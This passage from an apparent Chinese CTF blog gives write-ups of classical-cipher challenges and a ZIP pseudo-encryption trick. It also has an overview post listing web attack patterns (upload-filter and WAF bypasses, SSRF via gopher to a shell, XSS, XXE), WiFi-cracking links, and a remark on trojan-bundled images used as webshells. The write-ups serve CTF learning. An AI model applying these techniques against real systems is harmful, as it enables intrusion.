<li>加密（Encryption）：将明文变换成密文的过程</li>
<li>解密（Decryption）：加密的逆过程，即由密文恢复原明文的过程</li>
<li>加密算法（Encryption algorithm）：密码员对明文加密产生的一组规则</li>
<li>解密算法：接受这对密文进行解密时所采用的一种规则</li>
<li>密钥：控制加密和解密算法操作的数据处理，分别称作加密密钥和解密密钥</li>
</ul>
<h2 id="古典密码的发展"><a href="#古典密码的发展" class="headerlink" title="古典密码的发展"></a>古典密码的发展</h2><p>之前我们曾经说过凯撒密码，栅栏密码，培根密码，甚至将其按类划分成了置换密码，代换密码等。还有一个很重要的点就是维吉尼亚密码，在这里出现了密钥的雏形：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%886.16.12.png" alt="屏幕快照 2017-10-27 下午6.16.12.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午6.16.12.png</p>
            </figure>
<p>至于置换密码之前没有多做讲解，在这里举一个列置换的例子就比较好理解了，这个是根据数字列的顺序对明文重新排序</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%886.18.05.png" alt="屏幕快照 2017-10-27 下午6.18.05.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午6.18.05.png</p>
            </figure>
<p>说了这么多，接下来来几个案例来演示一下吧！</p>
<h3 id="困在栅栏里的凯撒"><a href="#困在栅栏里的凯撒" class="headerlink" title="困在栅栏里的凯撒"></a>困在栅栏里的凯撒</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%8811.13.53.png" alt="屏幕快照 2017-10-27 下午11.13.53.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午11.13.53.png</p>
            </figure>
<p>这道题的题干中首先说了是困在栅栏中的凯撒，所以我们首先应该解决的应该就是栅栏，在比赛中我们为了追求效率，一般都不会自己重新去造轮子，所以直接用CTFCrackTools这个工具就好(github中自寻)。首先跑一次栅栏：</p>
<blockquote>
<p>1：NEQ{etlydsf}</p>
<p>2：Ny{flQstEde}</p>
<p>3：NQeldfE{tys}</p>
<p>4：N{lsEeyfQtd}</p>
</blockquote>
<p>根据题目中说的很六的字符，有两种可能，一种是分了六个栅栏，或者是一个栅栏有6个字符，这一题显然是后者，果断的选择第一个之后，再跑一次凯撒：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/80177C31-7D91-4D00-BBDA-A71DD6EB1E47.png" alt="80177C31-7D91-4D00-BBDA-A71DD6EB1E47.png" title="" class="">
                <p>80177C31-7D91-4D00-BBDA-A71DD6EB1E47.png</p>
            </figure>
<h3 id="传统知识加古典密码"><a href="#传统知识加古典密码" class="headerlink" title="传统知识加古典密码"></a>传统知识加古典密码</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%8811.34.48.png" alt="屏幕快照 2017-10-27 下午11.34.48.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午11.34.48.png</p>
            </figure>
<p>传统知识应该指的就是天干地址所代表的数字，至于古典密码经典的凯撒和栅栏感觉应该是没跑的，通过查询资料得到了天干地址对应的数字，再加上60（一甲子）之后进行ASCII码转换得到了XZSDMFLZ</p>
<p>emm，首先使用凯撒发现不通，再使用栅栏：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%8811.37.27.png" alt="屏幕快照 2017-10-27 下午11.37.27.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午11.37.27.png</p>
            </figure></p>
<p>解出来两个，第一个代换之后并没有规律。接着试试第二个，果断跑通：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%8811.40.36.png" alt="屏幕快照 2017-10-27 下午11.40.36.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午11.40.36.png</p>
            </figure></p>
<p>ps:绕是如此，找这个破玩意还是花费了我不少时间。</p>
<h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%8811.52.31.png" alt="屏幕快照 2017-10-27 下午11.52.31.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午11.52.31.png</p>
            </figure>
<p>第一反应就是十进制转ASCII码，不要问我为什么，这都做不到就可以卸甲归田了。然后得到一串字符串：</p>
<blockquote>
<p>OCU{CFTELXOUYDECTNGAHOHRNFIENM}IOTA</p>
</blockquote>
<p>根据题目中的提示，应该是最后构造成CTF{xxx}的格式，尝试了栅栏密码之后发现并不对，就算是再使用一次凯撒也是一样，那么问题到底出在哪里呢？</p>
<p>苦思一番之后突然想到了置换密码，可以先看看列置换，因为说了利用key值的固定结构，所以如果把字符串分割一下</p>
<blockquote>
<p>OCU{CFT</p>
<p>ELXOUYD</p>
<p>ECTNGAH</p>
<p>OHRNFIE</p>
<p>NM}IOTA</p>
</blockquote>
<p>按照2，7，6，4，5，1，3重新排列一下，也就是CTF{xx}的形式，至于中间xx两列的顺序都尝试一下，最后发现有规律的就是flag了：CTF{COULDYOUEXCHANGETHEINFORMATION}</p>
<h3 id="杯酒人生"><a href="#杯酒人生" class="headerlink" title="杯酒人生"></a>杯酒人生</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8A%E5%8D%8812.45.17.png" alt="屏幕快照 2017-10-28 上午12.45.17.png" title="" class="">
                <p>屏幕快照 2017-10-28 上午12.45.17.png</p>
            </figure>
<p>在古典密码中涉及到密钥的应该就是维吉尼亚密码了，首先这里有一个自己加密过的密钥，使用凯撒和栅栏试一次之后得到了密钥：COMPUTER，那么接下来就是对密码进行加密就完成了，可以参照上面的对照表，也可以直接使用工具。</p>
<p>有一点需要注意的是，实验吧上的题目格式并不统一，所以提交的时候如果不对转换一下格式就好。</p>
<h3 id="他的情书"><a href="#他的情书" class="headerlink" title="他的情书"></a>他的情书</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8A%E5%8D%881.03.31.png" alt="屏幕快照 2017-10-28 上午1.03.31.png" title="" class="">
                <p>屏幕快照 2017-10-28 上午1.03.31.png</p>
            </figure>
<p>做完题目之后才发现这个出题者似乎是个超级英雄（原谅绿帽侠、或者单思狂魔），这里有一个解题链接，点进去之后跳转到一个网站，点击是没有用的，上面写着不要相信眼睛相信爱，然后我选择了<code>view-source</code>:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8A%E5%8D%881.08.38.png" alt="屏幕快照 2017-10-28 上午1.08.38.png" title="" class="">
                <p>屏幕快照 2017-10-28 上午1.08.38.png</p>
            </figure>
<p>那么我们就选择相信眼睛吧，通过escape解码之后得到了一串代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--<span class="function"><span class="keyword">function</span> <span class="title">zhegejiamiyidiandoubuku</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> pass=<span class="built_in">document</span>.form.passwd.value;<span class="keyword">var</span> cry=<span class="string">"Rm9yM0re354v5E4FUg5FasDboooo=="</span>;<span class="keyword">var</span> addr=<span class="string">'soroki.php?passwd='</span>;<span class="keyword">var</span> locatie=location.href;<span class="keyword">var</span> out=<span class="string">''</span>;<span class="keyword">var</span> pass2=cry.substring(<span class="number">15</span>,<span class="number">4</span>*<span class="number">4</span>)+cry.substring(<span class="number">24</span>,<span class="number">5</span>*<span class="number">5</span>)+cry.substring(<span class="number">0</span>,<span class="number">1</span>)+cry.substr(<span class="number">7</span>,<span class="number">1</span>)+cry.substr(<span class="number">11</span>,<span class="number">1</span>)+cry.substr(<span class="number">13</span>,<span class="number">1</span>)+cry.substring(<span class="number">3</span>+<span class="number">3</span>,<span class="number">7</span>);pass=locatie.substr(locatie.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>);addr=addr.substring(<span class="number">0</span>,addr.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>)+<span class="string">'l0vau='</span>;<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;pass.Len;i++)&#123;<span class="keyword">if</span>(pass.charAt(i)==pass2.charAt(i))&#123;<span class="built_in">document</span>.write(pass.charAt(i))&#125;&#125;location=addr+pass&#125;--&gt;</div></pre></td></tr></table></figure>
<p>在看懂了代码的意思之后，不会js的我选择了python:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">cry=<span class="string">"Rm9yM0re354v5E4FUg5FasDboooo=="</span></div><div class="line">addr=<span class="string">'soroki.php?passwd='</span></div><div class="line">locatie=<span class="string">"http://ctf4.shiyanbar.com/crypto/4/"</span></div><div class="line">pass2=cry[<span class="number">15</span>:<span class="number">16</span>]+cry[<span class="number">24</span>:<span class="number">25</span>]+cry[<span class="number">0</span>:<span class="number">1</span>]+cry[<span class="number">7</span>:<span class="number">8</span>]+cry[<span class="number">11</span>:<span class="number">12</span>]+cry[<span class="number">13</span>:<span class="number">14</span>]+cry[<span class="number">6</span>:<span class="number">7</span>]</div><div class="line">addr=addr[:addr.index(<span class="string">'?'</span>)+<span class="number">1</span>]+<span class="string">'l0vau='</span></div><div class="line">location=locatie+addr+pass2</div><div class="line"><span class="keyword">print</span> location</div><div class="line">html=requests.get(location)</div></pre></td></tr></table></figure>
<p>跑一次之后得到了一串网址，链接过去发现了一串base64字符串，解码之后得到：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8A%E5%8D%881.11.46.png" alt="屏幕快照 2017-10-28 上午1.11.46.png" title="" class="">
                <p>屏幕快照 2017-10-28 上午1.11.46.png</p>
            </figure>
<p>因为最后的答案是ctf{}的格式，最后再跑一次凯撒/栅栏吧–ctf{intwo_is_big_sb}(题主节哀)</p>
<h3 id="凯撒和某某加密"><a href="#凯撒和某某加密" class="headerlink" title="凯撒和某某加密"></a>凯撒和某某加密</h3><p>先看题目提示是“凯撒和某某加密”，首先确定一下有凯撒加密(ps:你这不是说废话麼)，然后还有一种加密方式是未知的。</p>
<p>看下密文：aZZg/x\ZbavpZiEZp+n)o+ 密文中有很多的符号/+)+根据这些可以确定，首先另外一种加密方式不是MD5和base64，原因就是：字母过多，而没有数字，并且通过移位以后符号也不能全部变成字母或者数字。</p>
<p>到这里觉得要不先解决一下凯撒加密，看看结果字符串是一个什么样的格式吧。这么多的符号，应该不是按照字母序来移动字母了，并且里面也没有代表flag{}格式的字符，可能是按照ascii码表来移动的，并且字母和符号都进行移动。那应该移动多少位呢？既然是ascii码表移动的，那就先把字符转化成ascii码吧。（其实是先用工具试了一波）</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%883.10.57.png" alt="屏幕快照 2017-10-28 下午3.10.57.png" title="" class="">
                <p>屏幕快照 2017-10-28 下午3.10.57.png</p>
            </figure>
<p>可以看出，其中ascii最大的是120，对应的字符是X，ascii最大是126，那如果向ascii增加的方向移动的话，移动的位数应该是小于6的；其中最小的是41，如果向ascii减小的方向去移动的话，移动位数应该小于9。</p>
<p>这里先选择向ascii增加的方向移动，因为我看到了”X”移动5位会变成”}”，那么写一个C语言就可以实现了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> a[<span class="number">1000</span>];</div><div class="line">	<span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%s"</span>,a)!=EOF)&#123;</div><div class="line">		<span class="keyword">int</span> i;</div><div class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(a);i++)</div><div class="line">		&#123;</div><div class="line">			a[i]=a[i]+<span class="number">5</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%s"</span>,a);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<p>然后得到了一串类似栅栏的密码：<code>f__14}a_ggf{u_nJ_u0s.t0</code>，用栅栏密码解不出来，后来发现其实这是一个变异版的栅栏，三三两两而不是每个栅栏都同样的。</p>
<p>所以从这道题中我们可以学到要发散自己的思维，不能总是停留在常规的加密方式，有时候要大胆的去猜想一下。</p>
<h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>下载下来一个压缩包，根据题目名去查找了一下相关资料，在这里就讲一下zip文件的组成，一个zip文件由三个部分组成：压缩源文件数据区、压缩源文件目录区、压缩源文件目录结束标志。下面通过一个实例讲解：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8B%E5%8D%885.24.21.png" alt="屏幕快照 2017-11-06 下午5.24.21.png" title="" class="">
                <p>屏幕快照 2017-11-06 下午5.24.21.png</p>
            </figure>
<h4 id="压缩源文件数据区："><a href="#压缩源文件数据区：" class="headerlink" title="压缩源文件数据区："></a><strong>压缩源文件数据区：</strong></h4><p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 </p>
<h4 id="压缩源文件目录区："><a href="#压缩源文件目录区：" class="headerlink" title="压缩源文件目录区："></a><strong>压缩源文件目录区：</strong></h4><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量 6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 </p>
<h4 id="压缩源文件目录结束标志："><a href="#压缩源文件目录结束标志：" class="headerlink" title="压缩源文件目录结束标志："></a><strong>压缩源文件目录结束标志：</strong></h4><p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p>
<p>根据以上的知识我们可以合理的猜想如果把一个zip文件的文件头或者加密标志位进行适当修改，那就可能会改变文件的可读性，比如下面这个例子中，我们就可以将一个无密码压缩包修改为一个有密码压缩包：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8B%E5%8D%885.30.22.png" alt="屏幕快照 2017-11-06 下午5.30.22.png" title="" class="">
                <p>屏幕快照 2017-11-06 下午5.30.22.png</p>
            </figure>
<p>于是这样就达到了zip伪加密的目的，可是这里又有一个疑问了，你可能会问，为什么改成09，而不是其他的数呢，其实改成09只是举的一个例子，只要末位是奇数，就代表加密，反之，末位是偶数代表未加密(这是一个经过验证的猜想)。但是如果想要修改头文件标志位的朋友时肯定会报错的。</p>
<h3 id="Ook-和Brainfuck"><a href="#Ook-和Brainfuck" class="headerlink" title="Ook!和Brainfuck"></a>Ook!和Brainfuck</h3><p>题目中丢出了一些不知所谓的符号，看起来没有什么很大的规律，使用移位、栅栏、列置换都没有很清晰的结果，后来我就去搜索了一下这些奇怪的字符组合，然后在Wiki上找到了答案：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8B%E5%8D%885.49.30.png" alt="屏幕快照 2017-11-06 下午5.49.30.png" title="" class="">
                <p>屏幕快照 2017-11-06 下午5.49.30.png</p>
            </figure>
<p>原来这两个是两种计算机编程语言的语法，这种语言被统称为esolang，旨在尝试各种奇怪的想法，难以编程，一般不会做为实际使用，所以这里只需要去搜索对应的网站进行解密即可。这里丢个<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="external">传送门</a></p>
]]></content>
      
        <categories>
            
            <category> 密码学的前生今生 实战讲解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[大话CTF]]></title>
      <url>/2017/10/23/%E5%A4%A7%E8%AF%9DCTF/</url>
      <content type="html"><![CDATA[<p>写这篇博客是因为似乎又要去比赛了，实力依然很重要，但是巧妙地利用一些套路会让自己更轻松。</p>
<a id="more"></a>
<h2 id="出题套路"><a href="#出题套路" class="headerlink" title="出题套路"></a>出题套路</h2><ol>
<li><p>爆破， md5，爆破随机数，验证码识别</p>
</li>
<li><p>密码题，包括hash长度扩展，异或，移位加密（凯撒密码等）各种变形、三十二位随机数过小</p>
</li>
<li><p>各种找源码的技巧，包括git、svn、xxx.php.swp、<em> www </em>.(zip|tar.gz|rar|7z)、xxx.php.bak</p>
</li>
<li><p>文件上传，包括花式文件后缀.php345、inc、phtml、photo、phps、各种文件内容检测</p>
</li>
<li><p>协议，伪造X-Forwarded-For/X-Client-IP/X-Real_IP/CDX-Src -IP、花式改UA，花式藏flag，花式分析数据包</p>
</li>
<li><p>绕WAF，包括花式绕Mysal、绕文件读取关键词检测之类的拦截</p>
</li>
<li><p>玩弄几个php特性：包括弱类型，strpos和===，反序列化destruct、\0截断、iconv截断</p>
</li>
<li><p>Mysql类型差异，包括和php弱类型类似的特性，0x、0b、1e之类，varchar和integer相互转换</p>
</li>
<li><p>windows特性，包括短文件名，IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断</p>
</li>
<li><p>SSRF,包括花式探测端口，302跳转、花式协议利用、gochar直接取shell等</p>
</li>
<li><p>XSS，各种浏览器的auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过</p>
</li>
<li><p>XXE，各种XML存在地方(rss/word/流媒体)、各种XXE利用方法(SSRF、文件读取) </p>
</li>
</ol>
<h2 id="数据包部分"><a href="#数据包部分" class="headerlink" title="数据包部分"></a>数据包部分</h2><p>对于数据包的分析我们一般都会借助于抓包工具，常用的抓包工具就是wireshark，其中过滤语法尤为重要，</p>
<p>可以参考下面几个网站进行初步的了解，剩下的部分就需要熟能生巧和对网络知识的了解了。</p>
<ul>
<li><a href="http://www.wireshark.org/download.html" target="_blank" rel="external">wireshark官方下载地址</a></li>
<li><a href="http://www.zhoulujun.cn/zhoulujun/html/theory/network/2016_1130_7908.html" target="_blank" rel="external">wireshark使用教程和过滤法总结</a></li>
<li><a href="http://fangxin.blog.51cto.com/1125131/735178" target="_blank" rel="external">wireshark使用和tcp三次握手/四次挥手讲解</a></li>
</ul>
<p>有时候会在数据包藏一些信息，也许就是我们需要的flag值，所以对于密码的破解也是必要的，比如wifi密码：</p>
<ul>
<li><a href="http://topspeedsnail.com/kali-linux-crack-wifi-wpa/" target="_blank" rel="external">Kali Linux破解wifi密码–aircrack-ng</a></li>
<li><a href="http://url.cn/5nYNaeR" target="_blank" rel="external">wifi重大安全漏洞(KRACK)–WPA2协议的崩溃</a></li>
<li><a href="http://xkon.github.io/2015/04/15/%E6%94%BB%E5%87%BB%E6%97%A0%E7%BA%BFWiFi/" target="_blank" rel="external">攻击无线wifi(还讲解了WEP加密的WI-FI)</a></li>
</ul>
<hr>
<h2 id="隐写术部分"><a href="#隐写术部分" class="headerlink" title="隐写术部分"></a>隐写术部分</h2><p>解决稍微复杂一点的隐写术工具是必不可少的，比如数据提取，查看二进制和十六进制等等，完整版在<a href="https://github.com/smartjinyu/ctf-tools" target="_blank" rel="external">GitHub</a>上，因为主要就是做这一部分，所以着重的讲一下：</p>
<ul>
<li><strong>Winhex</strong>、<strong>UltraEdit</strong>: 用于查看文件的二进制\十六进制代码</li>
<li><strong>StegSolve</strong>: 神器中的神器，能够对常见的图片格式进行偏移、LSB 提取、帧提取、像素偏移、数据提取，对两张图片进行结合等等，覆盖了常见的分析需求。<a href="http://www.caesum.com/handbook/Stegsolve.jar" target="_blank" rel="external">下载地址</a>，需要 Java 运行环境。 </li>
</ul>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-17%20%E4%B8%8B%E5%8D%889.53.04.png" alt="屏幕快照 2017-10-17 下午9.53.04.png"></p>
<ul>
<li><strong>Binwalk</strong>: 常用工具，可以进行文件的分析和提取。使用说明可参看<a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="external">这篇博客</a>，在 Linux 下运行 <code>sudo apt-get install binwalk</code> 即可安装。 </li>
<li><strong>Stegdetect</strong>: 用于检测 <code>JPEG</code> 文件中是否包含隐藏内容并尝试分析隐藏内容通过哪个隐写工具嵌入</li>
<li><strong>Outguess</strong>: 用于提取 <code>JPEG</code> 文件中使用 Outguess 算法的加入的隐藏信息</li>
<li><strong>JPHS</strong>: 用于对 <code>JPEG</code> 文件进行 Jhide 算法的隐写或提取，详细介绍及软件下载可以参见<a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="external">这篇博客</a>。</li>
<li><p><strong>MP3Stego</strong>: 用于对<code>MP3</code> 音频文件进行隐写、提取等操作，常用命令：</p>
<ul>
<li><code>encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3</code> 用于写入隐藏信息</li>
<li><code>decode -X -P pass svega_stego.mp3</code> 用于提取隐藏在音频文件中的信息 <a href="http://www.shiyanbar.com/ctf/1926" target="_blank" rel="external">例题</a></li>
</ul>
</li>
<li><p><strong>MSU Stego</strong>: 用于对 AVI 文件进行隐写\提取操作，介绍见<a href="http://www.compression.ru/video/stego_video/index_en.html" target="_blank" rel="external">官网</a></p>
</li>
</ul>
<ul>
<li>其他工具<ul>
<li><strong>QR Reader</strong>: 用于在 Windows 下进行 QR Code 的扫描，可以自定义参数</li>
<li><strong>Advanced Archive Password Recovery</strong>: 爆破压缩文档密码</li>
<li><strong>MD5 解密</strong>: 在线工具，用于解密 MD5 字符串</li>
<li><strong>在线加密解密</strong>: 亦是在线工具，支持各种加密协议</li>
</ul>
</li>
</ul>
<p>有时候分析出来的 flag 经过加密，简单的 Base64、MD5 等不再赘述，<a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="external">这篇博客</a>比较全面地总结了隐写术中用到的加密算法，可以参看。文中还提供了各种加密方式的解密工具。</p>
<h3 id="补充分析"><a href="#补充分析" class="headerlink" title="补充分析"></a>补充分析</h3><p>一般的隐写术都会使用图种的方式来隐藏信息，有时候通过将木马和图片捆绑，用菜刀去链接图片，然后就可以到达使用webshell提权的作用，但是这种形式有时候也是最容易发现的，如果发现是jpg图片的话，观察文件结束符之后的内容，查看是否附加内容，正常图片都会是FF D9结尾的（如果没有winhex使用sublime也是可以的，去掉文件后缀即可）。</p>
<p>还有一种方式就是使用kali下自带命令行工具binwalk，它可以自动化分析图片中附加的其他的文件，其原理就是检索匹配文件头，常用的一些文件头可以被发现，然后利用偏移配合winhex或者是dd分割出隐藏的部分。</p>
<h3 id="几种常见的文件头格式"><a href="#几种常见的文件头格式" class="headerlink" title="几种常见的文件头格式"></a>几种常见的文件头格式</h3><p>图片的格式很多，一个图片文件的后缀名并不能说明这个图片的真正格式什么，那么如何获取图片的格式呢？我想到了几个简单但有效的方法，那就是读取图片文件的文件头标识。我们知道各种格式的图片的文件头标识识不同的，因此我们可以通过判断文件头的标识来识别图片格式：</p>
<ol>
<li>JPEG/JPG 文件头标识 (2 bytes): FF D8 (SOI) (JPEG 文件标识) - 文件结束标识 (2 bytes): FF D9 (EOI) TGA - 未压缩的前5字节   00 00 02 00 00 - RLE压缩的前5字节   00 00 10 00 00</li>
<li>PNG - 文件头标识 (8 bytes)   89 50 4E 47 0D 0A 1A 0A</li>
<li>GIF - 文件头标识 (6 bytes)   47 49 46 38 39(37) 61                      </li>
<li>BMP - 文件头标识 (2 bytes)   42 4D                       </li>
<li>PCX - 文件头标识 (1 bytes)   0A</li>
<li>TIFF - 文件头标识 (2 bytes)  4D 4D 或 49 49</li>
<li>ICO - 文件头标识 (8 bytes)   00 00 01 00 01 00 20 20 </li>
<li>CUR - 文件头标识 (8 bytes)   00 00 02 00 01 00 20 20</li>
<li>IFF - 文件头标识 (4 bytes)   46 4F 52 4D                        </li>
<li>ANI - 文件头标识 (4 bytes)   52 49 46 46                         </li>
</ol>
<h3 id="几种隐写的方法介绍"><a href="#几种隐写的方法介绍" class="headerlink" title="几种隐写的方法介绍"></a>几种隐写的方法介绍</h3><ol>
<li>EOI：这是利用处理器的一个漏洞，因为处理器当处理到文件结束标识的时候便不会再继续往下处理了，这之后就可以进行隐写，比如说jpg格式的文件结束标识是FF D9，然而如果其中隐写了压缩包，我们就可以通过winhex之类的工具轻易的看到，这也是一种常用的隐写方式。</li>
<li>LSB算法：利用最低有效位 ，来隐藏我们的有效信息<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-19%20%E4%B8%8B%E5%8D%883.42.11.png" alt="屏幕快照 2017-10-19 下午3.42.11.png" title="" class="">
                <p>屏幕快照 2017-10-19 下午3.42.11.png</p>
            </figure></li>
</ol>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-19%20%E4%B8%8B%E5%8D%883.44.10.png" alt="屏幕快照 2017-10-19 下午3.44.10.png" title="" class="">
                <p>屏幕快照 2017-10-19 下午3.44.10.png</p>
            </figure>
<ol>
<li>还有一些比如F5隐写之类的就并不是特别的常见了，其实隐写一般都会配合着密码学一起</li>
</ol>
<p>看起来隐写术是个非常有趣的智力游戏，涉及密码学、文件格式、编程能力等的综合运用，目前我也仅在入门阶段，上述内容是个极简略极浅显的总结，适用于初学者快速入门，很多内容比如编程解法、Photoshop 解法、视频隐写等均未涉及。</p>
<hr>
<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-20%20%E4%B8%8A%E5%8D%889.23.41.png" alt="屏幕快照 2017-10-20 上午9.23.41.png" title="" class="">
                <p>屏幕快照 2017-10-20 上午9.23.41.png</p>
            </figure>
<p>上图应该比较清晰的表现了在密码学中的所有加密方式及其分类，可以根据这些点在网上自行查找，其中公钥加密和数字签名我们应该都比较熟悉了，在之前的ssh和中间人攻击都会了解的比较多，其中涉及到的就是非对称加密算法—RSA。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-20%20%E4%B8%8A%E5%8D%889.41.01.png" alt="屏幕快照 2017-10-20 上午9.41.01.png" title="" class="">
                <p>屏幕快照 2017-10-20 上午9.41.01.png</p>
            </figure>
